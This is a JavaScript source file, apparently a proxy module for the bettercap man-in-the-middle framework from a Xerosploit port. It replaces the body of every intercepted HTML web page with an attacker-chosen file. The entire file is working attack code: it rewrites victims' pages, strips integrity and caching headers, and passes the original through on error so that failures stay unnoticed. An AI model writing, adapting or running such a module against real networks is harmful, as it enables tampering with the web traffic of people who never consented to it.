// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- Deface
//
// Replaces the whole body of every proxied text/html response with the
// contents of the file referenced by the generated global XE_TARGET_FILE
// ("Overwrite all web pages with your HTML code").
//
// Defacement variant of the bettercap v1 Ruby proxy module
//   lib/bettercap/proxy/http/modules/injecthtml.rb   (GPLv3)
// used by Xerosploit's "Deface" menu entry: v1 wrapped the user file in a
// `document.body.innerHTML = ...` script; here the page is simply overwritten.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_TARGET_FILE  absolute path of the defacement HTML page.
//
// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
// "body modified" flag, so after the body has been read this module MUST write
// a body back or bettercap emits an EMPTY response.  The decision to rewrite
// is therefore made from method/status/headers alone; only then is the body
// read exactly once.  Every exit path after that read sets the body and a
// Content-Length equal to the UTF-8 byte length of the string it writes:
// either the defacement bytes, or the byte-exact original on failure.
// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
// touched.  A response this module does not handle is left byte-identical.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "deface";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
function xeGetHeader(headers, name) {
    if (!headers) { return null; }
    var want = ("" + name).toLowerCase();
    var key;
    for (key in headers) {
        if (("" + key).toLowerCase() === want) {
            var value = headers[key];
            if (value === null || value === undefined) { return null; }
            return value;
        }
    }
    return null;
}

// Decide, from method/status/headers ALONE (no body read), whether this
// response may be rewritten as a full-body 200.
function xeSkipResponse(req, res) {
    if (!req || req.Method !== "GET") { return true; }
    if (!res || res.Status !== 200) { return true; }
    if (xeGetHeader(req.Headers, "Range")) { return true; }
    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
    return false;
}

var XE_STALE_HEADERS = [
    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
];

function xeWriteBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
}

function xeReplaceBody(res, body, contentType) {
    if (typeof res.RemoveHeader === "function") {
        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
            res.RemoveHeader(XE_STALE_HEADERS[i]);
        }
    }
    if (contentType && typeof res.SetHeader === "function") {
        res.SetHeader("Content-Type", contentType);
    }
    xeWriteBody(res, body);
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

function onLoad() {
    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    xeLog("loaded (defacement file: " + target + ")");
}

function onResponse(req, res) {
    // Decide from headers/URL only; a skipped response is never read or mutated.
    if (!xeIsHtml(res)) { return; }
    if (xeSkipResponse(req, res)) { return; }

    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }

    var payload = xeReadFile(target);
    if (payload === null || payload === "") { xeWarn("empty defacement file: " + target); return; }

    // Committed to rewriting: read the body exactly once and always write back.
    var original = null;
    try {
        original = xeReadBody(res);
        if (typeof original !== "string") { return; }

        var where = (req && req.Hostname ? req.Hostname : "") + (req && req.Path ? req.Path : "");
        xeLog("defacing " + where + " with " + target);

        if (payload !== original) {
            xeReplaceBody(res, payload, "text/html; charset=utf-8");
        } else {
            xeWriteBody(res, original);
        }
    } catch (e) {
        xeWarn("onResponse failed: " + e);
        if (typeof original === "string") {
            xeWriteBody(res, original);                                  // fail-open: exact original bytes
        }
    }
}
